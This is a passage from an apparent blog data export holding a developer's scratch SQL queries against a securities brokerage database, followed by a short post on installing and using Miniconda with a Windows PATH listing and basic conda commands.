'B' WHERE FUND_ACCOUNT = 'IT20170101006';\nUPDATE FUNDACCOUNT SET ASSET_PROP = 'B' WHERE FUND_ACCOUNT = 'IO20170101004';\nUPDATE CLIENTPREFER SET CLIENT_INCOME_TYPE = '2' WHERE CLIENT_ID = 'IT20170101001';\nSELECT * from CLIENT WHERE id_no = '510212196801081335';\nSELECT client_name,CLIENT_id,id_no,id_kind,riskaccount_type from hs_crdt.riskacctlist;\nUPDATE CLIENT SET FULL_NAME = '王斌' WHERE CLIENT_ID = 'IT20170101001';\nUPDATE hs_crdt.riskacctlist set riskaccount_type = '0';\nUPDATE CLIENTPREFER SET CLIENT_INCOME_TYPE = '2' WHERE CLIENT_ID LIKE 'IO%';\nSELECT CLIENT_INCOME_TYPE,CLIENT_ID from CLIENTPREFER WHERE CLIENT_ID LIKE 'IO%';\nCOMMIT;\n\nselect st.client_id,ss.stock_account from hs_asset.sstrestradeacct ss ,HS_ASSET.STOCKHOLDER st WHERE ss.STOCK_ACCOUNT =st.STOCK_ACCOUNT ;\nUPDATE CLIENTPREFER SET PROF_FLAG = '0',PROF_TYPE='!'WHERE CLIENT_ID = 'IO20170101005';\n\nselect a.client_id,t.init_date,t.secum_market_value\nfrom hs_his.his_asset t\njoin hs_asset.fundaccount a on a.fund_account=t.fund_account where t.init_date='20170105' and a.client_id ='IT20170101024';\n\nSELECT h.fund_account,h.init_date,SECU_MARKET_VALUE from hs_his.his_asset h,FUNDACCOUNT f\nWHERE f.FUND_ACCOUNT=h.fund_account and f.CLIENT_ID = 'IT20170101024';\n\nSELECT * from BUSINESSACCEPT WHERE PRE_ANALYSIS_TYPE = 2;--WHERE CLIENT_ID like 'IT%' AND ACPT_CATEGORY_NO = 0053;\n\nSELECT * from hs_user.SYSDICTIONARY WHERE DICT_ENTRY = 2505;\n\nSELECT * from FUNDACCOUNT WHERE asset_prop = 7;\n\nSELECT * from BUSINESSACCEPT WHERE ACPT_CATEGORY_NO = '0018'\nselect a.en_prodrisk_level,ORGAN_FLAG  from  eligriskmatch a\nwhere a.finance_type = 1\n\n      and a.corp_risk_level = 2;\n\nselect a.en_prodrisk_level  from  eligriskmatch a\nwhere a.finance_type = 1\nand a.organ_flag = 1\nand a.corp_risk_level = 2;\n\n","slug":"work/sql","published":1,"updated":"2018-07-10T13:10:09.995Z","_id":"cjjedmhcd008c0gtjz3flh66x","comments":1,"layout":"post","photos":[],"link":"","content":"<p><code>`</code></p>\n<p>SELECT<br>  a.acpt_category_no,<br>  a.acpt_category_name,<br>  c.param_id,<br>  c.param_name,<br>  b.need_flag,<br>  b.organ_flag,<br>  b.prof_flag,<br>  b.prof_type,<br>  b.data_type,<br>  b.int_config,<br>  b.str_config<br>FROM hs_acpt.bopcategory a, hs_acpt.bopbusintypequaliarg b, hs_acpt.bopqualiarg c<br>WHERE a.acpt_category_no = b.acpt_busin_type AND b.param_id = c.param_id AND a.acpt_category_level = 2 AND<br>      b.need_flag = 1  AND a.acpt_category_no = ‘0044’–= ‘0252’ AND c.param_id<br>                                              IN<br>                          (‘0116’, ‘0018’, ‘0019’, ‘0027’, ‘0028’, ‘0041’, ‘0044’, ‘0045’, ‘0046’, ‘0053’, ‘0065’,<br>                            ‘0066’, ‘0116’, ‘0119’, ‘0122’, ‘0134’, ‘0168’, ‘0169’, ‘0172’, ‘0174’, ‘0177’, ‘0179’,<br>                           ‘0189’, ‘1002’, ‘1003’, ‘1004’,’0252’);</p>\n<p>select * from hs_acpt.bopbusintypequaliarg  WHERE acpt_busin_type  = 0018;</p>\n<p>INSERT INTO hs_acpt.bopbusintypequaliarg<br>(ACPT_BUSIN_TYPE, ORGAN_FLAG, PARAM_ID, DATA_TYPE, INT_CONFIG, STR_CONFIG, MODIFY_ABLE, NEED_FLAG, SHOW_TITLE, ORDER_NO, PROF_FLAG, PROF_TYPE)<br>VALUES (‘0018’, ‘0’, 24, ‘1’, 50, ‘1111111111111,20’, ‘1’, ‘1’, ‘ ‘, 7, ‘0’, ‘!’);<br>– 用户参数<br>SELECT t.ORGAN_FLAG,p.prof_flag,p.prof_type FROM CLIENTPREFER p,CLIENT t WHERE p.CLIENT_ID = t.CLIENT_ID AND t.CLIENT_ID = ‘IO20170101011’;</p>\n<p>select a.client_id,a.fund_account,a.asset_prop,t.init_date,t.money_type,<br>  d.fin_close_balance + d.slo_close_balance + d.fare_close_debit + d.fin_close_interest+ d.slo_close_interest + d.fin_close_fine_interest + d.slo_close_fine_interest+ d.other_close_interest + d.other_close_debit + d.other_close_fine_interest + d.refcost_close_fare as total_debit,<br>                                   t.fund_asset<br>                                   +t.secu_market_value<br>                                   +t.opfund_market_value<br>                                   +t.opt_market_value<br>                                   –+t.total_debit<br>                                   +t.prod_market_value<br>                                   +t.hkfund_market_value<br>                                   +t.ofcash_market_value<br>                                  +t.pfund_market_value<br>                                   +t.secum_market_value<br>                                as totalasset<br>from hs_his.his_asset t, hs_asset.fundaccount a,hs_data.assetdebit d<br>where a.fund_account=t.fund_account<br>  and a.fund_account = d.fund_account<br>  and t.init_date = d.init_date<br>  and t.money_type = d.money_type<br>  –and t.init_date = ‘20170104’<br>  and a.client_id like ‘IT20170101004%’;</p>\n<p>SELECT CLIENT_ID,ORGAN_FLAG,PROF_FLAG,PROF_TYPE from CLIENTPREFER WHERE CLIENT_ID = ‘IT20170101001’;<br>UPDATE  client set ORGAN_FLAG=’0’  WHERE CLIENT_ID = ‘IO20170101005’</p>\n<p>select * from  hs_acpt.bopbusintypequaliarg<br>UPDATE hs_acpt.bopbusintypequaliarg SET prof_flag = ‘1’ WHERE acpt_busin_type=’0044’ and param_id = 53<br>select ORGAN_FLAG from client where client_id=’IT20170101001’<br>select prof_flag from CLIENTPREFER where client_id=’IT20170101001’<br>– 业务<br>SELECT a.acpt_category_no,a.acpt_category_name,c.param_id,c.param_name,b.need_flag,b.organ_flag,b.prof_flag,b.prof_type,b.data_type,b.int_config,b.str_config<br>FROM hs_acpt.bopcategory a, hs_acpt.bopbusintypequaliarg b, hs_acpt.bopqualiarg c,CLIENTPREFER p,CLIENT t<br>WHERE a.acpt_category_no = b.acpt_busin_type AND b.param_id = c.param_id AND a.acpt_category_level = 2 AND b.need_flag = 1<br>     AND t.ORGAN_FLAG = b.organ_flag and p.prof_flag= b.prof_flag<br>      AND a.acpt_category_no = ‘0044’ –AND c.param_id in (50,51,52,53,54,55,56,57,58,60)<br>      and p.CLIENT_ID = t.CLIENT_ID<br>      AND t.CLIENT_ID = ‘IT20170101004’<br>ORDER BY param_id;<br>– 负债<br>SELECT fin_close_balance ,slo_close_balance , fare_close_debit , fin_close_interest, slo_close_interest , fin_close_fine_interest , slo_close_fine_interest, other_close_interest , other_close_debit , other_close_fine_interest, refcost_close_fare from hs_data.ASSETDEBIT WHERE CLIENT_ID = ‘IO20170101026’ AND INIT_DATE = ‘20170105’;</p>\n<p>SELECT * from BUSINESSACCEPT WHERE ACPT_CATEGORY_NO = ‘0252’;<br>  –CLIENT_ID LIKE ‘IT20170101001%’ and<br>  –PARAM_VALUE like ‘%#58#%’;</p>\n<p>– p50 p51 p52<br>SELECT CLIENT_ID,CLIENT_INCOME_TYPE as p50,THREE_YEARS_AVG_INCOM as p51,LAST_YEAR_NET_ASSET as p52 from CLIENTPREFER WHERE CLIENT_ID = ‘IT20170101004’;<br>– p53<br>SELECT c.CLIENT_ID from CLIENT c,hs_crdt.riskacctlist r WHERE r.id_kind = c.id_kind and r.id_no = c.id_no AND r.client_name = c.FULL_NAME and r.riskaccount_type = ‘0’;<br>– p54<br>SELECT o.CLIENT_ID from FUNDACCOUNT f ,OPTBLACKACCT o ,CLIENT c WHERE c.CLIENT_ID = o.CLIENT_ID AND f.ASSET_PROP = ‘B’ AND f.FUND_ACCOUNT= o.FUND_ACCOUNT;<br>– 55,56,57,58,60<br>SELECT CLIENT_ID,CORP_RISK_LEVEL as p55,EN_INVEST_TERM as p56,EN_INVEST_KIND as p57,CLIENT_INCOME_TYPE as p58,EN_MAXDEFICIT_RATE as p60 from CLIENTPREFER WHERE CLIENT_ID = ‘IT20170101004’;</p>\n<p>SELECT h.fund_account,h.init_date,SECU_MARKET_VALUE from hs_his.his_asset h,FUNDACCOUNT f WHERE f.FUND_ACCOUNT=h.fund_account and f.CLIENT_ID = ‘IT20170101024’;</p>\n<p>SELECT <em> from FUNDACCOUNT WHERE FUND_ACCOUNT = ‘IT20170101004’;<br>UPDATE FUNDACCOUNT SET ASSET_PROP = ‘B’ WHERE FUND_ACCOUNT = ‘IT20170101004’;<br>UPDATE FUNDACCOUNT SET ASSET_PROP = ‘B’ WHERE FUND_ACCOUNT = ‘IT20170101006’;<br>UPDATE FUNDACCOUNT SET ASSET_PROP = ‘B’ WHERE FUND_ACCOUNT = ‘IO20170101004’;<br>UPDATE CLIENTPREFER SET CLIENT_INCOME_TYPE = ‘2’ WHERE CLIENT_ID = ‘IT20170101001’;<br>SELECT </em> from CLIENT WHERE id_no = ‘510212196801081335’;<br>SELECT client_name,CLIENT_id,id_no,id_kind,riskaccount_type from hs_crdt.riskacctlist;<br>UPDATE CLIENT SET FULL_NAME = ‘王斌’ WHERE CLIENT_ID = ‘IT20170101001’;<br>UPDATE hs_crdt.riskacctlist set riskaccount_type = ‘0’;<br>UPDATE CLIENTPREFER SET CLIENT_INCOME_TYPE = ‘2’ WHERE CLIENT_ID LIKE ‘IO%’;<br>SELECT CLIENT_INCOME_TYPE,CLIENT_ID from CLIENTPREFER WHERE CLIENT_ID LIKE ‘IO%’;<br>COMMIT;</p>\n<p>select st.client_id,ss.stock_account from hs_asset.sstrestradeacct ss ,HS_ASSET.STOCKHOLDER st WHERE ss.STOCK_ACCOUNT =st.STOCK_ACCOUNT ;<br>UPDATE CLIENTPREFER SET PROF_FLAG = ‘0’,PROF_TYPE=’!’WHERE CLIENT_ID = ‘IO20170101005’;</p>\n<p>select a.client_id,t.init_date,t.secum_market_value<br>from hs_his.his_asset t<br>join hs_asset.fundaccount a on a.fund_account=t.fund_account where t.init_date=’20170105’ and a.client_id =’IT20170101024’;</p>\n<p>SELECT h.fund_account,h.init_date,SECU_MARKET_VALUE from hs_his.his_asset h,FUNDACCOUNT f<br>WHERE f.FUND_ACCOUNT=h.fund_account and f.CLIENT_ID = ‘IT20170101024’;</p>\n<p>SELECT * from BUSINESSACCEPT WHERE PRE_ANALYSIS_TYPE = 2;–WHERE CLIENT_ID like ‘IT%’ AND ACPT_CATEGORY_NO = 0053;</p>\n<p>SELECT * from hs_user.SYSDICTIONARY WHERE DICT_ENTRY = 2505;</p>\n<p>SELECT * from FUNDACCOUNT WHERE asset_prop = 7;</p>\n<p>SELECT * from BUSINESSACCEPT WHERE ACPT_CATEGORY_NO = ‘0018’<br>select a.en_prodrisk_level,ORGAN_FLAG  from  eligriskmatch a<br>where a.finance_type = 1</p>\n<pre><code>and a.corp_risk_level = 2;\n</code></pre><p>select a.en_prodrisk_level  from  eligriskmatch a<br>where a.finance_type = 1<br>and a.organ_flag = 1<br>and a.corp_risk_level = 2;</p>\n","site":{"data":{}},"excerpt":"","more":"<p><code>`</code></p>\n<p>SELECT<br>  a.acpt_category_no,<br>  a.acpt_category_name,<br>  c.param_id,<br>  c.param_name,<br>  b.need_flag,<br>  b.organ_flag,<br>  b.prof_flag,<br>  b.prof_type,<br>  b.data_type,<br>  b.int_config,<br>  b.str_config<br>FROM hs_acpt.bopcategory a, hs_acpt.bopbusintypequaliarg b, hs_acpt.bopqualiarg c<br>WHERE a.acpt_category_no = b.acpt_busin_type AND b.param_id = c.param_id AND a.acpt_category_level = 2 AND<br>      b.need_flag = 1  AND a.acpt_category_no = ‘0044’–= ‘0252’ AND c.param_id<br>                                              IN<br>                          (‘0116’, ‘0018’, ‘0019’, ‘0027’, ‘0028’, ‘0041’, ‘0044’, ‘0045’, ‘0046’, ‘0053’, ‘0065’,<br>                            ‘0066’, ‘0116’, ‘0119’, ‘0122’, ‘0134’, ‘0168’, ‘0169’, ‘0172’, ‘0174’, ‘0177’, ‘0179’,<br>                           ‘0189’, ‘1002’, ‘1003’, ‘1004’,’0252’);</p>\n<p>select * from hs_acpt.bopbusintypequaliarg  WHERE acpt_busin_type  = 0018;</p>\n<p>INSERT INTO hs_acpt.bopbusintypequaliarg<br>(ACPT_BUSIN_TYPE, ORGAN_FLAG, PARAM_ID, DATA_TYPE, INT_CONFIG, STR_CONFIG, MODIFY_ABLE, NEED_FLAG, SHOW_TITLE, ORDER_NO, PROF_FLAG, PROF_TYPE)<br>VALUES (‘0018’, ‘0’, 24, ‘1’, 50, ‘1111111111111,20’, ‘1’, ‘1’, ‘ ‘, 7, ‘0’, ‘!’);<br>– 用户参数<br>SELECT t.ORGAN_FLAG,p.prof_flag,p.prof_type FROM CLIENTPREFER p,CLIENT t WHERE p.CLIENT_ID = t.CLIENT_ID AND t.CLIENT_ID = ‘IO20170101011’;</p>\n<p>select a.client_id,a.fund_account,a.asset_prop,t.init_date,t.money_type,<br>  d.fin_close_balance + d.slo_close_balance + d.fare_close_debit + d.fin_close_interest+ d.slo_close_interest + d.fin_close_fine_interest + d.slo_close_fine_interest+ d.other_close_interest + d.other_close_debit + d.other_close_fine_interest + d.refcost_close_fare as total_debit,<br>                                   t.fund_asset<br>                                   +t.secu_market_value<br>                                   +t.opfund_market_value<br>                                   +t.opt_market_value<br>                                   –+t.total_debit<br>                                   +t.prod_market_value<br>                                   +t.hkfund_market_value<br>                                   +t.ofcash_market_value<br>                                  +t.pfund_market_value<br>                                   +t.secum_market_value<br>                                as totalasset<br>from hs_his.his_asset t, hs_asset.fundaccount a,hs_data.assetdebit d<br>where a.fund_account=t.fund_account<br>  and a.fund_account = d.fund_account<br>  and t.init_date = d.init_date<br>  and t.money_type = d.money_type<br>  –and t.init_date = ‘20170104’<br>  and a.client_id like ‘IT20170101004%’;</p>\n<p>SELECT CLIENT_ID,ORGAN_FLAG,PROF_FLAG,PROF_TYPE from CLIENTPREFER WHERE CLIENT_ID = ‘IT20170101001’;<br>UPDATE  client set ORGAN_FLAG=’0’  WHERE CLIENT_ID = ‘IO20170101005’</p>\n<p>select * from  hs_acpt.bopbusintypequaliarg<br>UPDATE hs_acpt.bopbusintypequaliarg SET prof_flag = ‘1’ WHERE acpt_busin_type=’0044’ and param_id = 53<br>select ORGAN_FLAG from client where client_id=’IT20170101001’<br>select prof_flag from CLIENTPREFER where client_id=’IT20170101001’<br>– 业务<br>SELECT a.acpt_category_no,a.acpt_category_name,c.param_id,c.param_name,b.need_flag,b.organ_flag,b.prof_flag,b.prof_type,b.data_type,b.int_config,b.str_config<br>FROM hs_acpt.bopcategory a, hs_acpt.bopbusintypequaliarg b, hs_acpt.bopqualiarg c,CLIENTPREFER p,CLIENT t<br>WHERE a.acpt_category_no = b.acpt_busin_type AND b.param_id = c.param_id AND a.acpt_category_level = 2 AND b.need_flag = 1<br>     AND t.ORGAN_FLAG = b.organ_flag and p.prof_flag= b.prof_flag<br>      AND a.acpt_category_no = ‘0044’ –AND c.param_id in (50,51,52,53,54,55,56,57,58,60)<br>      and p.CLIENT_ID = t.CLIENT_ID<br>      AND t.CLIENT_ID = ‘IT20170101004’<br>ORDER BY param_id;<br>– 负债<br>SELECT fin_close_balance ,slo_close_balance , fare_close_debit , fin_close_interest, slo_close_interest , fin_close_fine_interest , slo_close_fine_interest, other_close_interest , other_close_debit , other_close_fine_interest, refcost_close_fare from hs_data.ASSETDEBIT WHERE CLIENT_ID = ‘IO20170101026’ AND INIT_DATE = ‘20170105’;</p>\n<p>SELECT * from BUSINESSACCEPT WHERE ACPT_CATEGORY_NO = ‘0252’;<br>  –CLIENT_ID LIKE ‘IT20170101001%’ and<br>  –PARAM_VALUE like ‘%#58#%’;</p>\n<p>– p50 p51 p52<br>SELECT CLIENT_ID,CLIENT_INCOME_TYPE as p50,THREE_YEARS_AVG_INCOM as p51,LAST_YEAR_NET_ASSET as p52 from CLIENTPREFER WHERE CLIENT_ID = ‘IT20170101004’;<br>– p53<br>SELECT c.CLIENT_ID from CLIENT c,hs_crdt.riskacctlist r WHERE r.id_kind = c.id_kind and r.id_no = c.id_no AND r.client_name = c.FULL_NAME and r.riskaccount_type = ‘0’;<br>– p54<br>SELECT o.CLIENT_ID from FUNDACCOUNT f ,OPTBLACKACCT o ,CLIENT c WHERE c.CLIENT_ID = o.CLIENT_ID AND f.ASSET_PROP = ‘B’ AND f.FUND_ACCOUNT= o.FUND_ACCOUNT;<br>– 55,56,57,58,60<br>SELECT CLIENT_ID,CORP_RISK_LEVEL as p55,EN_INVEST_TERM as p56,EN_INVEST_KIND as p57,CLIENT_INCOME_TYPE as p58,EN_MAXDEFICIT_RATE as p60 from CLIENTPREFER WHERE CLIENT_ID = ‘IT20170101004’;</p>\n<p>SELECT h.fund_account,h.init_date,SECU_MARKET_VALUE from hs_his.his_asset h,FUNDACCOUNT f WHERE f.FUND_ACCOUNT=h.fund_account and f.CLIENT_ID = ‘IT20170101024’;</p>\n<p>SELECT <em> from FUNDACCOUNT WHERE FUND_ACCOUNT = ‘IT20170101004’;<br>UPDATE FUNDACCOUNT SET ASSET_PROP = ‘B’ WHERE FUND_ACCOUNT = ‘IT20170101004’;<br>UPDATE FUNDACCOUNT SET ASSET_PROP = ‘B’ WHERE FUND_ACCOUNT = ‘IT20170101006’;<br>UPDATE FUNDACCOUNT SET ASSET_PROP = ‘B’ WHERE FUND_ACCOUNT = ‘IO20170101004’;<br>UPDATE CLIENTPREFER SET CLIENT_INCOME_TYPE = ‘2’ WHERE CLIENT_ID = ‘IT20170101001’;<br>SELECT </em> from CLIENT WHERE id_no = ‘510212196801081335’;<br>SELECT client_name,CLIENT_id,id_no,id_kind,riskaccount_type from hs_crdt.riskacctlist;<br>UPDATE CLIENT SET FULL_NAME = ‘王斌’ WHERE CLIENT_ID = ‘IT20170101001’;<br>UPDATE hs_crdt.riskacctlist set riskaccount_type = ‘0’;<br>UPDATE CLIENTPREFER SET CLIENT_INCOME_TYPE = ‘2’ WHERE CLIENT_ID LIKE ‘IO%’;<br>SELECT CLIENT_INCOME_TYPE,CLIENT_ID from CLIENTPREFER WHERE CLIENT_ID LIKE ‘IO%’;<br>COMMIT;</p>\n<p>select st.client_id,ss.stock_account from hs_asset.sstrestradeacct ss ,HS_ASSET.STOCKHOLDER st WHERE ss.STOCK_ACCOUNT =st.STOCK_ACCOUNT ;<br>UPDATE CLIENTPREFER SET PROF_FLAG = ‘0’,PROF_TYPE=’!’WHERE CLIENT_ID = ‘IO20170101005’;</p>\n<p>select a.client_id,t.init_date,t.secum_market_value<br>from hs_his.his_asset t<br>join hs_asset.fundaccount a on a.fund_account=t.fund_account where t.init_date=’20170105’ and a.client_id =’IT20170101024’;</p>\n<p>SELECT h.fund_account,h.init_date,SECU_MARKET_VALUE from hs_his.his_asset h,FUNDACCOUNT f<br>WHERE f.FUND_ACCOUNT=h.fund_account and f.CLIENT_ID = ‘IT20170101024’;</p>\n<p>SELECT * from BUSINESSACCEPT WHERE PRE_ANALYSIS_TYPE = 2;–WHERE CLIENT_ID like ‘IT%’ AND ACPT_CATEGORY_NO = 0053;</p>\n<p>SELECT * from hs_user.SYSDICTIONARY WHERE DICT_ENTRY = 2505;</p>\n<p>SELECT * from FUNDACCOUNT WHERE asset_prop = 7;</p>\n<p>SELECT * from BUSINESSACCEPT WHERE ACPT_CATEGORY_NO = ‘0018’<br>select a.en_prodrisk_level,ORGAN_FLAG  from  eligriskmatch a<br>where a.finance_type = 1</p>\n<pre><code>and a.corp_risk_level = 2;\n</code></pre><p>select a.en_prodrisk_level  from  eligriskmatch a<br>where a.finance_type = 1<br>and a.organ_flag = 1<br>and a.corp_risk_level = 2;</p>\n"},{"title":"Conda Anaconda","date":"2018-07-10T13:09:19.000Z","_content":"```\nC:\\ProgramData\\Miniconda3;\nC:\\ProgramData\\Miniconda3\\Library\\mingw-w64\\bin;\nC:\\ProgramData\\Miniconda3\\Library\\usr\\bin;\nC:\\ProgramData\\Miniconda3\\Library\\bin;\nC:\\ProgramData\\Miniconda3\\Scripts;\nC:\\Program Files (x86)\\py\\Scripts\\;\nC:\\Program Files (x86)\\py\\;\nD:\\oracle\\product\\10.2.0\\client_1\\bin;\nC:\\Program Files (x86)\\Common Files\\NetSarang;\nC:\\Program Files (x86)\\Intel\\iCLS Client\\;\nC:\\Program Files\\Intel\\iCLS Client\\;%SystemRoot%\\system32;%SystemRoot%;%SystemRoot%\\System32\\Wbem;%SYSTEMROOT%\\System32\\WindowsPowerShell\\v1.0\\;\nC:\\Program Files (x86)\\Intel\\Intel(R) Management Engine Components\\DAL;\nC:\\Program Files\\Intel\\Intel(R) Management Engine Components\\DAL;\nC:\\Program Files (x86)\\Intel\\Intel(R) Management Engine Components\\IPT;\nC:\\Program Files\\Intel\\Intel(R) Management Engine Components\\IPT;%MAVEN_HOME%\\bin;%JAVA_HOME%\\bin;%JAVA_HOME%\\jre\\bin;%CATALINA_HOME%\\lib;%CATALINA_HOME%\\bin;\nC:\\Program Files\\TortoiseSVN\\bin;\n```\nThese Miniconda installers contain the conda package manager and Python. Once Miniconda is installed, you can use the conda command to install any other packages and create environments, etc. For example:\n\n```\n$ conda install numpy\n\n$ conda create -n py3k anaconda python=3\n```\nThere are two variants of the installer: Miniconda is Python 2 based and Miniconda3 is Python 3 based. Note that the choice of which Miniconda is installed only affects the root environment. Regardless of which version of Miniconda you install, you can still install both Python 2.x and Python 3.x environments.\n\nThe other difference is that the Python 3 version of Miniconda will default to Python 3 when creating new environments and building packages. So for instance, the behavior of\n\n```\n$ conda create -n myenv python\n```\nwill be to install Python 2.7 with the Python 2 Miniconda and to install Python 3.6 with the Python 3 Miniconda. You can override the default by explicitly setting python=2 or python=3. It also determines the default value of CONDA_PY when using conda build.\n\nWe have 32-bit Mac OS X binaries available, please contact us for more details at sales@continuum.io.\n\nNote: If you already have Miniconda or Anaconda installed, and you just want to upgrade, you should not use the installer. Just use conda update. For instance\n```\n$ conda update conda\n```","source":"_posts/开发工具/Conda Anaconda.md","raw":"---\ntitle: Conda Anaconda\ndate: 2018-07-10 21:09:19\ntags: 开发工具\n---\n```\nC:\\ProgramData\\Miniconda3;\nC:\\ProgramData\\Miniconda3\\Library\\mingw-w64\\bin;\nC:\\ProgramData\\Miniconda3\\Library\\usr\\bin;\nC:\\ProgramData\\Miniconda3\\Library\\bin;\nC:\\ProgramData\\Miniconda3\\Scripts;\nC:\\Program Files (x86)\\py\\Scripts\\;\nC:\\Program Files (x86)\\py\\;\nD:\\oracle\\product\\10.2.0\\client_1\\bin;\nC:\\Program Files (x86)\\Common Files\\NetSarang;\nC:\\Program Files (x86)\\Intel\\iCLS Client\\;\nC:\\Program Files\\Intel\\iCLS Client\\;%SystemRoot%\\system32;%SystemRoot%;%SystemRoot%\\System32\\Wbem;%SYSTEMROOT%\\System32\\WindowsPowerShell\\v1.0\\;\nC:\\Program Files (x86)\\Intel\\Intel(R) Management Engine Components\\DAL;\nC:\\Program Files\\Intel\\Intel(R) Management Engine Components\\DAL;\nC:\\Program Files (x86)\\Intel\\Intel(R) Management Engine Components\\IPT;\nC:\\Program Files\\Intel\\Intel(R) Management Engine Components\\IPT;%MAVEN_HOME%\\bin;%JAVA_HOME%\\bin;%JAVA_HOME%\\jre\\bin;%CATALINA_HOME%\\lib;%CATALINA_HOME%\\bin;\nC:\\Program Files\\TortoiseSVN\\bin;\n```\nThese Miniconda installers contain the conda package manager and Python. Once Miniconda is installed, you can use the conda command to install any other packages and create environments, etc. For example:\n\n```\n$ conda install numpy\n\n$ conda create -n py3k anaconda python=3\n```\nThere are two variants of the installer: Miniconda is Python 2 based and Miniconda3 is Python 3 based. Note that the choice of which Miniconda is installed only affects the root environment. Regardless of which version of Miniconda you install, you can still install both Python 2.x and Python 3.x environments.\n\nThe other difference is that the Python 3 version of Miniconda will default to Python 3 when creating new environments and building packages. So for instance, the behavior of\n\n```\n$ conda create -n myenv python\n```\nwill be to install Python 2.7 with the Python 2 Miniconda and to install Python 3.6 with the Python 3 Miniconda. You can override the default by explicitly setting python=2 or python=3. It also determines the default value of CONDA_PY when using conda build.\n\nWe have 32-bit Mac OS X binaries available, please contact us for more details at sales@continuum.io.\n\nNote: If you already have Miniconda or Anaconda installed, and you just want to upgrade, you should not use the installer. Just use conda update. For instance\n```\n$ conda update conda\n```","slug":"开发工具/Conda Anaconda","published":1,"updated":"2018-07-10T13:10:09.997Z","_id":"cjjedmhce008e0gtjezafu10r","comments":1,"layout":"post","photos":[],"link":"","content":"<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">C:\\ProgramData\\Miniconda3;</span><br><span class=\"line\">C:\\ProgramData\\Miniconda3\\Library\\mingw-w64\\bin;</span><br><span class=\"line\">C:\\ProgramData\\Miniconda3\\Library\\usr\\bin;</span><br><span class=\"line\">C:\\ProgramData\\Miniconda3\\Library\\bin;</span><br><span class=\"line\">C:\\ProgramData\\Miniconda3\\Scripts;</span><br><span class=\"line\">C:\\Program Files (x86)\\py\\Scripts\\;</span><br><span class=\"line\">C:\\Program Files (x86)\\py\\;</span><br><span class=\"line\">D:\\oracle\\product\\10.2.0\\client_1\\bin;</span><br><span class=\"line\">C:\\Program Files (x86)\\Common Files\\NetSarang;</span><br><span class=\"line\">C:\\Program Files (x86)\\Intel\\iCLS Client\\;</span><br><span class=\"line\">C:\\Program Files\\Intel\\iCLS Client\\;%SystemRoot%\\system32;%SystemRoot%;%SystemRoot%\\System32\\Wbem;%SYSTEMROOT%\\System32\\WindowsPowerShell\\v1.0\\;</span><br><span class=\"line\">C:\\Program Files (x86)\\Intel\\Intel(R) Management Engine Components\\DAL;</span><br><span class=\"line\">C:\\Program Files\\Intel\\Intel(R) Management Engine Components\\DAL;</span><br><span class=\"line\">C:\\Program Files (x86)\\Intel\\Intel(R) Management Engine Components\\IPT;</span><br><span class=\"line\">C:\\Program Files\\Intel\\Intel(R) Management Engine Components\\IPT;%MAVEN_HOME%\\bin;%JAVA_HOME%\\bin;%JAVA_HOME%\\jre\\bin;%CATALINA_HOME%\\lib;%CATALINA_HOME%\\bin;</span><br><span class=\"line\">C:\\Program Files\\TortoiseSVN\\bin;</span><br></pre></td></tr></table></figure>\n<p>These Miniconda installers contain the conda package manager and Python. Once Miniconda is installed, you can use the conda command to install any other packages and create environments, etc. For example:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ conda install numpy</span><br><span class=\"line\"></span><br><span class=\"line\">$ conda create -n py3k anaconda python=3</span><br></pre></td></tr></table></figure>\n<p>There are two variants of the installer: Miniconda is Python 2 based and Miniconda3 is Python 3 based. Note that the choice of which Miniconda is installed only affects the root environment. Regardless of which version of Miniconda you install, you can still install both Python 2.x and Python 3.x environments.</p>\n<p>The other difference is that the Python 3 version of Miniconda will default to Python 3 when creating new environments and building packages. So for instance, the behavior of</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ conda create -n myenv python</span><br></pre></td></tr></table></figure>\n<p>will be to install Python 2.7 with the Python 2 Miniconda and to install Python 3.6 with the Python 3 Miniconda. You can override the default by explicitly setting python=2 or python=3. It also determines the default value of CONDA_PY when using conda build.</p>\n<p>We have 32-bit Mac OS X binaries available, please contact us for more details at <a href=\"mailto:sales@continuum.io\" target=\"_blank\" rel=\"noopener\">sales@continuum.io</a>.</p>\n<p>Note: If you already have Miniconda or Anaconda installed, and you just want to upgrade, you should not use the installer. Just use conda update. For instance<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ conda update conda</span><br></pre></td></tr></table></figure></p>\n","site":{"data":{}},"excerpt":"","more":"<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">C:\\ProgramData\\Miniconda3;</span><br><span class=\"line\">C:\\ProgramData\\Miniconda3\\Library\\mingw-w64\\bin;</span><br><span class=\"line\">C:\\ProgramData\\Miniconda3\\Library\\usr\\bin;</span><br><span class=\"line\">C:\\ProgramData\\Miniconda3\\Library\\bin;</span><br><span class=\"line\">C:\\ProgramData\\Miniconda3\\Scripts;</span><br><span class=\"line\">C:\\Program Files (x86)\\py\\Scripts\\;</span><br><span class=\"line\">C:\\Program Files (x86)\\py\\;</span><br><span class=\"line\">D:\\oracle\\product\\10.2.0\\client_1\\bin;</span><br><span class=\"line\">C:\\Program Files (x86)\\Common Files\\NetSarang;</span><br><span class=\"line\">C:\\Program Files (x86)\\Intel\\iCLS Client\\;</span><br><span 